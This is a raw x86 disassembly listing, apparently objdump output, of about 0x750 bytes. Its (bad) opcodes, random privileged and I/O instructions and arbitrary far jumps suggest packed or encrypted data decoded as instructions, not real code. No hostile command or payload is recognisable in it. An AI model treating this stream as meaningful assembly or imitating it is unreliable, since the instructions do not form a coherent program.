  41a50a:	cmp    al,0xf3
  41a50c:	mov    ah,0xdb
  41a50e:	push   0xadb65533
  41a513:	cld    
  41a514:	sub    BYTE PTR [ebp-0x78],bl
  41a517:	dec    edi
  41a518:	(bad)  
  41a519:	jg     0x41a50d
  41a51b:	jb     0x41a51a
  41a51d:	(bad)  
  41a51f:	add    eax,0x5f744717
  41a524:	push   esp
  41a525:	xor    BYTE PTR [esi+0x5c3de47],bl
  41a52b:	sbb    al,0x0
  41a52d:	std    
  41a52e:	push   eax
  41a52f:	je     0x41a56d
  41a531:	test   BYTE PTR [ebx-0x14],al
  41a534:	jae    0x41a4bf
  41a536:	int3   
  41a537:	lods   al,BYTE PTR ds:[esi]
  41a538:	push   es
  41a539:	lfs    esi,FWORD PTR [eax+eiz*2+0x68]
  41a53e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a53f:	cmp    BYTE PTR [ebx],cl
  41a541:	add    eax,0xaa555c59
  41a546:	aam    0x2f
  41a548:	jo     0x41a5af
  41a54a:	not    DWORD PTR [ebp+0x6fb76ab9]
  41a550:	jne    0x41a52d
  41a552:	xchg   esp,eax
  41a553:	das    
  41a554:	xchg   esp,ebx
  41a556:	pmullw mm2,QWORD PTR ds:0x9428e880
  41a55d:	sub    al,0xb5
  41a55f:	enter  0x4e95,0xa1
  41a563:	shl    DWORD PTR [ebx+0x5902727b],cl
  41a569:	cmp    al,BYTE PTR [ebp-0x49]
  41a56c:	loope  0x41a4ef
  41a56e:	and    esi,DWORD PTR [edi+0x2]
  41a571:	mov    ebx,0xe98b1266
  41a576:	sti    
  41a577:	(bad)  
  41a578:	xor    ebx,DWORD PTR [ebx]
  41a57a:	(bad)  
  41a57b:	leave  
  41a57c:	test   al,0x21
  41a57e:	or     eax,0x1e50f528
  41a583:	es jg  0x41a58e
  41a586:	sub    dl,0x8a
  41a589:	push   edi
  41a58a:	loop   0x41a55d
  41a58c:	cdq    
  41a58d:	and    ecx,DWORD PTR ds:0xf4a057f8
  41a593:	cmp    eax,0x3fe20b54
  41a598:	inc    ecx
  41a599:	gs pop ds
  41a59b:	xor    esp,ecx
  41a59d:	or     ebp,edx
  41a59f:	add    bh,BYTE PTR [ecx-0x265b965d]
  41a5a5:	push   es
  41a5a6:	retf   0xe59a
  41a5a9:	add    eax,0xed4b3705
  41a5ae:	push   edx
  41a5af:	xchg   DWORD PTR [eax-0x1f],ebp
  41a5b2:	sub    al,0x5b
  41a5b4:	pushf  
  41a5b5:	repz mov cs,WORD PTR [esi]
  41a5b8:	fdivr  st,st(0)
  41a5ba:	add    bh,BYTE PTR [edx]
  41a5bc:	mov    BYTE PTR [ebp+0x4108844b],dh
  41a5c2:	jo     0x41a591
  41a5c4:	and    edi,DWORD PTR [edi+0x2e]
  41a5c7:	mov    ecx,0x740ce3cb
  41a5cc:	cli    
  41a5cd:	sub    eax,0xf2f34836
  41a5d2:	fmul   DWORD PTR [esi+0x45875699]
  41a5d8:	and    BYTE PTR [ecx+edi*8],dl
  41a5db:	xchg   esp,eax
  41a5dc:	mov    ah,0xfd
  41a5de:	mov    ecx,0x4f8504a3
  41a5e3:	enter  0x4f64,0x7
  41a5e7:	push   cs
  41a5e8:	pusha  
  41a5e9:	push   esi
  41a5ea:	ds hlt 
  41a5ec:	outs   dx,DWORD PTR ds:[esi]
  41a5ed:	lahf   
  41a5ee:	(bad)  [edi]
  41a5f0:	jnp    0x41a611
  41a5f2:	mov    bl,0xe5
  41a5f4:	lods   al,BYTE PTR ds:[esi]
  41a5f5:	sbb    BYTE PTR [ebx+0x72a03983],0xc4
  41a5fc:	xchg   DWORD PTR [edi],edx
  41a5fe:	inc    ecx
  41a5ff:	in     eax,dx
  41a600:	cmp    al,0x3e
  41a602:	sahf   
  41a603:	in     al,dx
  41a604:	and    dh,dh
  41a606:	dec    edx
  41a607:	dec    esp
  41a608:	in     al,0xfb
  41a60a:	lds    ebp,FWORD PTR [edi]
  41a60c:	in     al,dx
  41a60d:	cmp    eax,edx
  41a60f:	das    
  41a610:	mov    dl,0x76
  41a612:	enter  0xc744,0x80
  41a616:	aad    0x4b
  41a618:	jecxz  0x41a699
  41a61a:	into   
  41a61b:	fdivp  st(4),st
  41a61d:	jnp    0x41a691
  41a61f:	je     0x41a66b
  41a621:	sub    BYTE PTR [eax+0x50],cl
  41a624:	lea    edx,[esi-0x4d7f6f12]
  41a62a:	and    edi,edi
  41a62c:	ins    DWORD PTR es:[edi],dx
  41a62d:	sub    edx,edi
  41a62f:	call   DWORD PTR [edi+0x6f]
  41a632:	stos   BYTE PTR es:[edi],al
  41a633:	sub    bh,BYTE PTR [esi-0x19]
  41a636:	loop   0x41a62f
  41a638:	ror    BYTE PTR [edx-0x3b],1
  41a63b:	fldenv [ebp+0x4e64315a]
  41a641:	test   al,0xb4
  41a643:	inc    esi
  41a644:	add    al,bl
  41a646:	cs pop esp
  41a648:	xchg   ebx,eax
  41a649:	cld    
  41a64a:	sbb    cl,BYTE PTR [eax+esi*8]
  41a64d:	lock pop ecx
  41a64f:	push   esp
  41a650:	and    eax,0xc1c43b47
  41a655:	add    BYTE PTR [ecx],0xcb
  41a658:	pop    es
  41a659:	jg     0x41a605
  41a65b:	push   edi
  41a65c:	ror    eax,0x53
  41a65f:	sub    eax,0x4d098311
  41a664:	dec    ecx
  41a665:	xchg   ecx,eax
  41a666:	fld    QWORD PTR [esi+0xfe54bef]
  41a66c:	xchg   dl,dh
  41a66e:	mov    ds:0x23971cc0,al
  41a673:	and    eax,0xd821401a
  41a678:	add    eax,0x4e69180f
  41a67d:	(bad)  
  41a67e:	enter  0xe124,0xd1
  41a682:	jae    0x41a702
  41a684:	and    BYTE PTR [ecx],cl
  41a686:	add    DWORD PTR [esi],ebx
  41a688:	repz into 
  41a68a:	dec    eax
  41a68b:	pop    ebx
  41a68c:	cmp    DWORD PTR [ebx+0x79],edx
  41a68f:	inc    edi
  41a690:	adc    BYTE PTR [esi-0x3a1aa608],0x48
  41a697:	mov    eax,0xf1f1b346
  41a69c:	add    BYTE PTR [ebx+edx*2+0x6b748cf5],0x71
  41a6a4:	xchg   edi,eax
  41a6a5:	mov    eax,ds:0x18fbb5b6
  41a6aa:	or     BYTE PTR [edi+0x8],dh
  41a6ad:	xchg   DWORD PTR [edx+0x25cdb545],ebx
  41a6b3:	pop    DWORD PTR [ecx+0x4b587ea0]
  41a6b9:	xor    dh,dh
  41a6bb:	ss cdq 
  41a6bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6be:	cmp    eax,0xcf9d9bbf
  41a6c3:	out    dx,al
  41a6c4:	popa   
  41a6c5:	into   
  41a6c6:	cmc    
  41a6c7:	mov    bl,0xf7
  41a6c9:	loope  0x41a662
  41a6cb:	xor    BYTE PTR [eax+0x31af4ab9],al
  41a6d1:	xor    BYTE PTR [edi+0x44],cl
  41a6d4:	rcr    DWORD PTR [eax+0x275f5802],1
  41a6da:	lock xlat BYTE PTR ds:[ebx]
  41a6dc:	dec    ecx
  41a6dd:	lahf   
  41a6de:	pop    ds
  41a6df:	dec    edi
  41a6e0:	xor    DWORD PTR [esi],eax
  41a6e2:	iret   
  41a6e3:	cli    
  41a6e4:	(bad)  
  41a6e6:	push   esp
  41a6e7:	and    esi,DWORD PTR [edx]
  41a6e9:	pop    es
  41a6ea:	shl    bl,cl
  41a6ec:	repnz rol al,1
  41a6ef:	(bad)  
  41a6f0:	xchg   esp,eax
  41a6f1:	aaa    
  41a6f2:	sub    BYTE PTR [esi-0x3ca5aca],bh
  41a6f8:	push   ss
  41a6f9:	imul   DWORD PTR [ebx]
  41a6fb:	rol    BYTE PTR [ecx+0x773d540c],1
  41a701:	ins    BYTE PTR es:[edi],dx
  41a702:	mov    fs,ebp
  41a704:	mov    ds:0xfdacc5a2,al
  41a709:	mov    edx,DWORD PTR [ecx+0x19a88425]
  41a70f:	int3   
  41a710:	jmp    0xdc03d97a
  41a715:	push   cs
  41a716:	pop    edi
  41a717:	inc    eax
  41a718:	(bad)  
  41a719:	fwait
  41a71a:	je     0x41a6b5
  41a71c:	call   0x24eeb84a
  41a721:	sbb    ah,0x76
  41a724:	mov    ebp,0x470f8639
  41a729:	mov    al,BYTE PTR [edx]
  41a72b:	sahf   
  41a72c:	push   es
  41a72d:	mov    ebp,DWORD PTR [ebp-0x52]
  41a730:	push   0x21
  41a732:	mov    edi,DWORD PTR [esi]
  41a734:	pushf  
  41a735:	jp     0x41a6b7
  41a737:	stc    
  41a738:	loope  0x41a709
  41a73a:	mov    bl,0x38
  41a73c:	cmp    BYTE PTR [edi],ah
  41a73e:	in     eax,dx
  41a73f:	cmp    ebp,DWORD PTR ds:[edi]
  41a742:	mov    ebx,DWORD PTR [ebx]
  41a744:	test   al,0xbb
  41a746:	xchg   cl,bl
  41a748:	mov    WORD PTR [ebp+0x7],?
  41a74b:	cs push edx
  41a74d:	jp     0x41a796
  41a74f:	cmc    
  41a750:	mov    ecx,0xeb35a119
  41a755:	pop    ds
  41a756:	(bad)  
  41a757:	pop    ecx
  41a758:	adc    al,bl
  41a75a:	ror    DWORD PTR [ecx+0xa82cfe6],1
  41a760:	pop    edi
  41a761:	mov    eax,DWORD PTR [esi]
  41a763:	sub    BYTE PTR ss:[ecx+ebx*4+0x5d],ch
  41a768:	sbb    eax,0xb9afed88
  41a76d:	or     bh,dh
  41a76f:	pop    edi
  41a770:	pop    ecx
  41a771:	sub    edx,esi
  41a773:	jmp    0xd48140be
  41a778:	cs xchg edx,eax
  41a77a:	mov    eax,ds:0x575ee964
  41a77f:	jg     0x41a7e0
  41a781:	fist   DWORD PTR ds:0x3d4a243b
  41a787:	call   0x5929877a
  41a78c:	outs   dx,DWORD PTR ds:[esi]
  41a78d:	mov    esp,0x6429c425
  41a792:	dec    esi
  41a793:	(bad)  
  41a794:	xor    al,BYTE PTR [ebp+0x76]
  41a797:	dec    esi
  41a798:	fwait
  41a799:	mov    dl,al
  41a79b:	mov    al,ds:0x59cda50e
  41a7a0:	hlt    
  41a7a1:	inc    ebx
  41a7a2:	or     al,0x62
  41a7a4:	jl     0x41a791
  41a7a6:	push   edi
  41a7a7:	in     al,dx
  41a7a8:	cmp    dh,BYTE PTR [ebx-0x1c]
  41a7ab:	sbb    DWORD PTR [ecx+ebx*2+0x53],0xbcff1a27
  41a7b3:	adc    bl,BYTE PTR [edx+0x48207d65]
  41a7b9:	leave  
  41a7ba:	cmp    ebp,DWORD PTR [esi-0x72f78071]
  41a7c0:	mov    eax,0x7e21b580
  41a7c5:	fnstcw WORD PTR [edx-0x21]
  41a7c8:	jbe    0x41a752
  41a7ca:	sub    BYTE PTR [edi*8-0x4125a127],dh
  41a7d1:	push   esi
  41a7d2:	pop    ebp
  41a7d3:	inc    ebp
  41a7d4:	arpl   WORD PTR [ecx],sp
  41a7d6:	loope  0x41a797
  41a7d8:	xor    al,0xc
  41a7da:	mov    ecx,0x4434a29f
  41a7df:	or     edi,DWORD PTR [edx+0x79]
  41a7e2:	sbb    DWORD PTR [edi-0x1c],eax
  41a7e5:	jge    0x41a7d9
  41a7e7:	enter  0xc0f9,0xaa
  41a7eb:	jns    0x41a7a2
  41a7ed:	sar    BYTE PTR [esi],cl
  41a7ef:	nop
  41a7f0:	(bad)  
  41a7f1:	dec    ebx
  41a7f2:	fild   DWORD PTR [eax+ecx*2-0x6c]
  41a7f6:	pop    es
  41a7f7:	sbb    eax,0x18513013
  41a7fc:	or     BYTE PTR [edi-0x6f],dh
  41a7ff:	in     eax,0x12
  41a801:	mov    ah,0x24
  41a803:	xor    DWORD PTR [ecx],eax
  41a805:	xchg   edi,eax
  41a806:	pop    es
  41a807:	xchg   ebp,eax
  41a808:	add    eax,0x7ae47d5d
  41a80d:	add    al,0xe6
  41a80f:	jno    0x41a84f
  41a811:	pop    esi
  41a812:	push   DWORD PTR [ecx+0x27dc0c04]
  41a818:	iret   
  41a819:	pop    ss
  41a81a:	mov    dl,0x33
  41a81c:	xchg   esp,eax
  41a81d:	or     esp,DWORD PTR [ebp+0x43845c32]
  41a823:	sub    BYTE PTR [ebp+0x316b381b],cl
  41a829:	dec    ecx
  41a82a:	fstp   TBYTE PTR [edi+esi*2]
  41a82d:	cld    
  41a82e:	js     0x41a7db
  41a830:	fs ss js 0x41a872
  41a834:	es out dx,eax
  41a836:	add    BYTE PTR [eax+edx*2+0x118ad3b7],bh
  41a83d:	add    esi,esp
  41a83f:	das    
  41a840:	jg     0x41a876
  41a842:	xlat   BYTE PTR ds:[ebx]
  41a843:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a844:	dec    ebx
  41a845:	and    esp,edi
  41a847:	jb     0x41a8a1
  41a849:	cld    
  41a84a:	sar    BYTE PTR [ebx+0x76],0x70
  41a84e:	dec    ebx
  41a84f:	sbb    edx,DWORD PTR [ecx+0x2a]
  41a852:	or     eax,0x95486b4a
  41a857:	mov    al,ds:0xe276095c
  41a85c:	bound  edi,QWORD PTR [edi+0x3fbdbb6f]
  41a862:	adc    eax,0x334ea29d
  41a867:	xchg   esi,eax
  41a868:	dec    edx
  41a869:	inc    esp
  41a86a:	sbb    al,BYTE PTR [eax+ecx*8-0x5c6bf4f5]
  41a871:	cmc    
  41a872:	xor    DWORD PTR [ebx],edi
  41a874:	adc    bl,BYTE PTR [ecx]
  41a876:	adc    BYTE PTR [ecx],bh
  41a878:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a879:	mov    bh,bh
  41a87b:	pop    es
  41a87c:	iret   
  41a87d:	(bad)  
  41a87e:	pop    edx
  41a87f:	jecxz  0x41a87c
  41a881:	call   0x5f2a:0xdd059cf0
  41a888:	pop    ebx
  41a889:	sar    BYTE PTR [esi],0xb1
  41a88c:	ins    BYTE PTR es:[di],dx
  41a88e:	push   esp
  41a88f:	cmp    eax,0xc38f70da
  41a894:	and    DWORD PTR [edx-0x67141a15],0x29
  41a89b:	push   es
  41a89c:	jb     0x41a8cd
  41a89e:	mov    ch,0x92
  41a8a0:	ins    BYTE PTR es:[edi],dx
  41a8a1:	pop    ss
  41a8a2:	enter  0xab79,0x12
  41a8a6:	fcom   QWORD PTR [edx]
  41a8a8:	pop    ebx
  41a8a9:	xchg   ecx,eax
  41a8aa:	jo     0x41a8fb
  41a8ac:	xor    esi,DWORD PTR [ebp*4+0x2b309789]
  41a8b3:	lods   al,BYTE PTR ds:[esi]
  41a8b4:	fwait
  41a8b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8b6:	jmp    0x141067ab
  41a8bb:	mov    ecx,0x701819cd
  41a8c0:	and    bl,BYTE PTR [edi+esi*1-0x53248ce2]
  41a8c7:	mov    DWORD PTR [edx+0x2737fdca],edi
  41a8cd:	fisub  DWORD PTR [esi+ebx*8-0x7c581467]
  41a8d4:	mov    esi,0xefb2ac53
  41a8d9:	fsubr  DWORD PTR [ecx-0x59feff9d]
  41a8df:	sti    
  41a8e0:	mov    ds:0x9ecd9fcd,al
  41a8e5:	cwde   
  41a8e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8e7:	ins    BYTE PTR es:[edi],dx
  41a8e8:	or     bl,dl
  41a8ea:	adc    DWORD PTR [ebx],0xa2157e92
  41a8f0:	sub    DWORD PTR [ecx],esp
  41a8f2:	frstor [edi+edi*4+0x1f]
  41a8f6:	(bad)  
  41a8f7:	retf   
  41a8f8:	je     0x41a8b3
  41a8fa:	push   es
  41a8fb:	jl     0x41a89f
  41a8fd:	xor    BYTE PTR [edi-0x22e74dff],ch
  41a903:	mov    BYTE PTR [eax+0x10],cl
  41a906:	inc    ecx
  41a907:	jo     0x41a935
  41a909:	jp     0x41a911
  41a90b:	dec    eax
  41a90c:	out    dx,al
  41a90d:	push   ss
  41a90e:	mov    ecx,0x75c623df
  41a913:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a914:	bound  eax,QWORD PTR [ebp+0x17]
  41a917:	into   
  41a918:	mov    ebp,0xab8ccabb
  41a91d:	test   edi,ebx
  41a91f:	out    0x8b,eax
  41a921:	adc    WORD PTR [ebx-0x1d],ax
  41a925:	cmp    edi,edi
  41a927:	scas   eax,DWORD PTR es:[edi]
  41a928:	xlat   BYTE PTR ds:[ebx]
  41a929:	push   eax
  41a92a:	adc    DWORD PTR [ebx-0x19],0xffffffac
  41a92e:	adc    BYTE PTR [ebx+edx*1+0x11],0xef
  41a933:	jl     0x41a8f1
  41a935:	test   al,0xd2
  41a937:	icebp  
  41a938:	test   DWORD PTR [esi-0x3c],edx
  41a93b:	xchg   ebx,eax
  41a93c:	cs ja  0x41a9b2
  41a93f:	push   edi
  41a940:	sbb    DWORD PTR [eax],edx
  41a942:	cmp    al,0x4a
  41a944:	cld    
  41a945:	dec    edi
  41a946:	pop    DWORD PTR [edi+0x28]
  41a949:	dec    ebp
  41a94a:	xchg   DWORD PTR [edi-0x4c708cbf],esi
  41a950:	cld    
  41a951:	(bad)  
  41a952:	mov    ds:0x1c3d6063,eax
  41a957:	fucomi st,st(1)
  41a959:	aas    
  41a95a:	jb     0x41a9ab
  41a95c:	lods   al,BYTE PTR ds:[esi]
  41a95d:	sysenter 
  41a95f:	xchg   ecx,eax
  41a960:	xor    eax,0xcd3ea740
  41a965:	das    
  41a966:	xor    ebx,DWORD PTR [ecx+0x5a5ba323]
  41a96c:	enter  0x7600,0xe5
  41a970:	lods   al,BYTE PTR ds:[esi]
  41a971:	push   ebp
  41a972:	arpl   bp,bx
  41a974:	adc    DWORD PTR [esi+0x3f],edi
  41a977:	dec    ebx
  41a978:	dec    esp
  41a979:	sbb    esp,DWORD PTR [edx-0x90fe7eb]
  41a97f:	and    edx,DWORD PTR [ecx-0x518bf0ae]
  41a985:	dec    edx
  41a986:	xchg   edx,eax
  41a987:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41a989:	scas   al,BYTE PTR es:[edi]
  41a98a:	push   es
  41a98b:	aas    
  41a98c:	xchg   ecx,eax
  41a98d:	mov    DWORD PTR gs:[edx+eax*2-0x3a53ceb6],ecx
  41a995:	pop    es
  41a996:	sub    eax,0x87cebe8c
  41a99b:	mov    al,bh
  41a99d:	jmp    0xe1fa:0x6fb5e7cb
  41a9a4:	outs   dx,BYTE PTR ds:[esi]
  41a9a5:	iret   
  41a9a6:	cli    
  41a9a7:	retf   
  41a9a8:	add    al,0xf9
  41a9aa:	pop    esp
  41a9ac:	fcmovnu st,st(0)
  41a9ae:	jnp    0x41a9f7
  41a9b0:	popa   
  41a9b1:	inc    eax
  41a9b2:	mov    cl,0xfe
  41a9b4:	ins    DWORD PTR es:[edi],dx
  41a9b5:	cmp    DWORD PTR [ebp-0x5ff1291f],0x5f
  41a9bc:	adc    ah,BYTE PTR [edx-0x20]
  41a9bf:	paddusw mm6,QWORD PTR [ecx+0x44]
  41a9c3:	lods   eax,DWORD PTR ds:[esi]
  41a9c4:	push   edi
  41a9c5:	das    
  41a9c6:	outs   dx,DWORD PTR ds:[esi]
  41a9c7:	cmp    dh,ah
  41a9c9:	leave  
  41a9ca:	aas    
  41a9cb:	pop    es
  41a9cc:	inc    esp
  41a9cd:	lds    edi,FWORD PTR [edx-0x7e]
  41a9d0:	push   ds
  41a9d1:	adc    ebx,0x243206a3
  41a9d7:	mov    ecx,0xb20fe6d8
  41a9dc:	repnz lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9df:	push   edi
  41a9e0:	mov    ecx,0x4063d48a
  41a9e5:	out    0xc7,eax
  41a9e7:	ins    BYTE PTR es:[edi],dx
  41a9e8:	in     eax,0x7c
  41a9ea:	xor    ch,BYTE PTR ds:0x4198702f
  41a9f0:	fdivr  QWORD PTR [edx-0x6c]
  41a9f3:	pop    edi
  41a9f4:	out    dx,eax
  41a9f5:	jecxz  0x41a9b3
  41a9f7:	jo     0x41aa1f
  41a9f9:	mov    bh,0xf3
  41a9fb:	sti    
  41a9fc:	mov    WORD PTR [esi-0x6994092a],?
  41aa02:	inc    esi
  41aa03:	add    BYTE PTR [ecx],ch
  41aa05:	dec    edi
  41aa06:	sub    DWORD PTR [esi+0xa215680],esi
  41aa0c:	push   esp
  41aa0d:	push   0x4243cc4
  41aa12:	stc    
  41aa13:	fucomp st(6)
  41aa15:	pushf  
  41aa16:	test   BYTE PTR [esi],dl
  41aa18:	mov    al,ds:0x43b051a3
  41aa1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa1e:	(bad)  
  41aa1f:	xor    ah,BYTE PTR [ebp-0x7ea4bcd0]
  41aa25:	pushf  
  41aa26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa27:	sub    al,0xe1
  41aa29:	sbb    DWORD PTR [ecx+0x2d],esp
  41aa2c:	in     eax,dx
  41aa2d:	jno    0x41aa9f
  41aa2f:	push   edx
  41aa30:	das    
  41aa31:	scas   eax,DWORD PTR es:[edi]
  41aa32:	fimul  DWORD PTR [edx+eax*8]
  41aa35:	rcl    BYTE PTR [ecx-0x15c6e3f],1
  41aa3b:	mov    ecx,0x987d4a8d
  41aa40:	jmp    0xb133b4a2
  41aa45:	xchg   esi,eax
  41aa46:	pushf  
  41aa47:	mov    cs,WORD PTR [ecx+0x3e5ea9e]
  41aa4d:	stc    
  41aa4e:	xchg   edi,eax
  41aa4f:	mov    eax,ds:0x492212d7
  41aa54:	add    al,0xe
  41aa56:	and    DWORD PTR [ebp-0x78],0x10
  41aa5a:	jmp    FWORD PTR [eax+eax*4-0x1ea6d91e]
  41aa61:	fmul   DWORD PTR [ebx+esi*4+0x12]
  41aa65:	sub    DWORD PTR [ebx],0x42
  41aa68:	dec    ebp
  41aa69:	mov    al,0x54
  41aa6b:	xor    DWORD PTR [edi],eax
  41aa6d:	aad    0x74
  41aa6f:	cdq    
  41aa70:	pop    esi
  41aa71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa72:	stos   DWORD PTR es:[edi],eax
  41aa73:	dec    ebx
  41aa74:	mov    dl,0x86
  41aa76:	test   esi,ebx
  41aa78:	dec    edx
  41aa79:	repz das 
  41aa7b:	scas   eax,DWORD PTR es:[edi]
  41aa7c:	stos   DWORD PTR es:[edi],eax
  41aa7d:	dec    edx
  41aa7e:	out    dx,al
  41aa7f:	sbb    eax,0x287ac52b
  41aa84:	inc    ebp
  41aa85:	sar    ebx,0xc5
  41aa88:	push   esp
  41aa89:	inc    esp
  41aa8a:	sub    dl,bh
  41aa8c:	adc    DWORD PTR [ebp+0x18],esp
  41aa8f:	jae    0x41aa7a
  41aa91:	push   edi
  41aa92:	mov    dh,0x84
  41aa94:	pop    ebp
  41aa95:	sahf   
  41aa96:	and    al,0x1e
  41aa98:	jle    0x41aab1
  41aa9a:	mov    bl,0xea
  41aa9c:	retf   0x9cbb
  41aa9f:	push   esi
  41aaa0:	sub    ch,BYTE PTR [ebx+0x68a97f7e]
  41aaa6:	inc    edx
  41aaa7:	sub    BYTE PTR [ecx],bl
  41aaa9:	stc    
  41aaaa:	(bad)  
  41aaab:	jl     0x41aad4
  41aaad:	adc    cl,BYTE PTR [edi+0x0]
  41aab0:	inc    eax
  41aab1:	push   ds
  41aab2:	imul   DWORD PTR [ecx+0x6e6550f]
  41aab8:	iret   
  41aab9:	mov    ds:0xdfdf5922,eax
  41aabe:	adc    dl,cl
  41aac0:	dec    edi
  41aac1:	mov    esp,0xaef68b31
  41aac6:	sub    ah,BYTE PTR ds:0xa4059e63
  41aacc:	push   edx
  41aacd:	xlat   BYTE PTR ds:[ebx]
  41aace:	test   BYTE PTR fs:[ebp+0x326439a5],al
  41aad5:	mov    esp,edx
  41aad7:	cwde   
  41aad8:	jecxz  0x41aaa3
  41aada:	lods   eax,DWORD PTR ds:[esi]
  41aadb:	imul   BYTE PTR [ebx-0x37b0cf02]
  41aae1:	sbb    edx,ebp
  41aae3:	test   eax,0x6188389e
  41aae8:	loop   0x41aaaa
  41aaea:	cmp    bh,0x7f
  41aaed:	xor    ah,BYTE PTR [ecx-0x5]
  41aaf0:	inc    ebx
  41aaf1:	lods   eax,DWORD PTR ds:[esi]
  41aaf2:	sub    BYTE PTR [eax-0x77],al
  41aaf5:	outs   dx,DWORD PTR ds:[esi]
  41aaf6:	lods   eax,DWORD PTR ds:[esi]
  41aaf7:	test   al,0xc3
  41aaf9:	sub    cl,BYTE PTR [eax+edx*2+0x67049617]
  41ab00:	in     al,dx
  41ab01:	add    bh,cl
  41ab03:	dec    edx
  41ab04:	out    dx,al
  41ab05:	lock cmp DWORD PTR [esi-0xe],0x4005125a
  41ab0d:	and    BYTE PTR [ecx+0x106f66df],0xcc
  41ab14:	sub    eax,0xd746700
  41ab19:	push   0x17
  41ab1b:	cmp    ah,BYTE PTR [ecx+esi*2+0x240e656d]
  41ab22:	arpl   WORD PTR [esi+0xb],ax
  41ab25:	aad    0x9e
  41ab27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab28:	lods   eax,DWORD PTR ds:[esi]
  41ab29:	sub    esi,DWORD PTR [edx+ecx*8+0x3be15c1d]
  41ab30:	je     0x41ab4a
  41ab32:	sbb    esi,esi
  41ab34:	jae    0x41ab0d
  41ab36:	in     al,0x61
  41ab38:	inc    edx
  41ab39:	or     eax,0x729ca559
  41ab3e:	and    BYTE PTR [eax],dh
  41ab40:	ja     0x41ab3c
  41ab42:	and    esp,ebx
  41ab44:	cmp    BYTE PTR [esi+eax*4],0x33
  41ab48:	out    0xc8,al
  41ab4a:	add    eax,DWORD PTR [ecx+0x56]
  41ab4d:	shl    BYTE PTR [ebp-0x61df9789],1
  41ab53:	into   
  41ab54:	sbb    DWORD PTR [ebx+ebp*2-0x50],0xffffffc4
  41ab59:	loope  0x41ab39
  41ab5b:	jno    0x41ab4d
  41ab5d:	mov    ah,BYTE PTR [edx-0x514ff51e]
  41ab63:	pushf  
  41ab64:	cmp    dl,BYTE PTR [eax+edx*1+0x19]
  41ab68:	imul   ecx,ebx,0x6a
  41ab6b:	jne    0x41ab73
  41ab6d:	cmp    BYTE PTR [ebx],bl
  41ab6f:	xlat   BYTE PTR ds:[ebx]
  41ab70:	or     ebx,DWORD PTR [esi]
  41ab72:	cmc    
  41ab73:	adc    esi,edi
  41ab75:	das    
  41ab76:	ror    BYTE PTR [edi-0x2c7425c6],cl
  41ab7c:	aam    0xb2
  41ab7e:	(bad)  [ecx-0xe]
  41ab81:	xor    edx,DWORD PTR [esi-0x73]
  41ab84:	jb     0x41ac03
  41ab86:	add    edx,DWORD PTR [ebp+0x11e95344]
  41ab8c:	(bad)  
  41ab8d:	mov    dh,0x14
  41ab8f:	arpl   WORD PTR [esi],ax
  41ab91:	pop    esp
  41ab92:	xchg   esi,eax
  41ab93:	mov    ebp,DWORD PTR [eax+0x34]
  41ab96:	sbb    bh,dl
  41ab98:	call   0xd8e6:0x7efce989
  41ab9f:	dec    ebx
  41aba0:	jno    0x41abc5
  41aba2:	or     edi,DWORD PTR [edi]
  41aba4:	in     al,dx
  41aba5:	loopne 0x41ac04
  41aba7:	adc    dl,dh
  41aba9:	or     al,0xdf
  41abab:	or     BYTE PTR [esp+edx*1],al
  41abae:	ins    BYTE PTR es:[edi],dx
  41abaf:	je     0x41ac22
  41abb1:	inc    ecx
  41abb2:	dec    esp
  41abb3:	in     al,0x75
  41abb5:	shl    BYTE PTR [eax-0x35],cl
  41abb8:	stos   BYTE PTR es:[edi],al
  41abb9:	adc    al,0x85
  41abbb:	icebp  
  41abbc:	dec    edx
  41abbd:	push   esi
  41abbe:	test   BYTE PTR [esi-0x4dff8af6],ah
  41abc4:	repnz int3 
  41abc6:	mov    cl,0x46
  41abc8:	not    BYTE PTR [eax-0x21ea8e13]
  41abce:	cmp    BYTE PTR [ebx+esi*1+0x78],dl
  41abd2:	in     eax,dx
  41abd3:	(bad)  
  41abd4:	(bad)  
  41abd5:	enter  0x317d,0xee
  41abd9:	adc    DWORD PTR [ecx-0x6],0x3a12a003
  41abe0:	xchg   ebp,eax
  41abe1:	sar    DWORD PTR [eax-0x6d88692b],0xcc
  41abe8:	fldcw  WORD PTR [esi+ebx*4+0x456c9db4]
  41abef:	pop    ds
  41abf0:	mov    cl,ch
  41abf2:	mov    eax,ds:0xa937e10e
  41abf7:	mov    fs:0x5c364fc6,eax
  41abfd:	data16 jp 0x41ac3c
  41ac00:	fwait
  41ac01:	mov    ecx,0x629b2782
  41ac06:	xor    BYTE PTR [esi-0x5a],0xfe
  41ac0a:	lahf   
  41ac0b:	retf   
  41ac0c:	xchg   esp,eax
  41ac0d:	fdiv   DWORD PTR [edx-0x4f23c8b2]
  41ac13:	retf   
  41ac14:	daa    
  41ac15:	and    dl,BYTE PTR [eax-0x1b0e4504]
  41ac1b:	enter  0x24a1,0x7d
  41ac1f:	sbb    al,0x61
  41ac21:	sahf   
  41ac22:	mov    edx,0xb4f5de93
  41ac27:	xor    bh,BYTE PTR [edi+0xde5f8b4]
  41ac2d:	push   cs
  41ac2e:	sbb    cl,al
  41ac30:	xchg   ebp,eax
  41ac31:	int3   
  41ac32:	sub    bh,BYTE PTR [ebx-0x7e]
  41ac35:	(bad)  
  41ac37:	adc    bh,BYTE PTR [ebx-0x7620baf4]
  41ac3d:	add    al,0x55
  41ac3f:	add    DWORD PTR [edx+edi*1],0xffffff99
  41ac43:	or     DWORD PTR [ebp-0x1cd05d9d],eax
  41ac49:	mov    al,ds:0x3c6a087b
  41ac4e:	fdivr  st(3),st
  41ac50:	lods   al,BYTE PTR ds:[esi]
  41ac51:	mov    eax,ds:0x5e41183f
  41ac56:	outs   dx,DWORD PTR ds:[esi]
  41ac57:	sbb    eax,0x1bb26c01
  41ac5c:	nop
  41ac5d:	inc    ebp
